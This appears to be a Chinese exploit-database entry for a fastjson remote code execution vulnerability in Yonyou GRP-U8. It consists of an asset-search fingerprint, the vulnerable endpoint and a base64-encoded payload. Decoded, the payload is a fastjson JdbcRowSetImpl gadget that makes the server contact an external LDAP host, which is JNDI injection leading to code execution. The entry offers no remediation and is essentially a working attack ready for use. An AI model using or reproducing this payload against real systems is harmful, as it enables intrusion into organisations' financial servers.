# 用友GRP-U8存在fastjson远程代码执行漏洞(XVE-2024-8863)

用友 ｜ 命令执行 ｜ —
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /VerifyToken HTTP/1.1`

**Payload**
```
PARAM=eyJuYW1lIjp7IkB0eXBlIjoiamF2YS5sYW5nLkNsYXNzIiwidmFsIjoiY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGwifSwieCI6eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIiwiZGF0YVNvdXJjZU5hbWUiOiJsZGFwOi8vMjIyMjIubGRiY3d1ZXZiYS5kZ3JoMy5jbiIsImF1dG9Db21taXQiOnRydWV9fQ==
```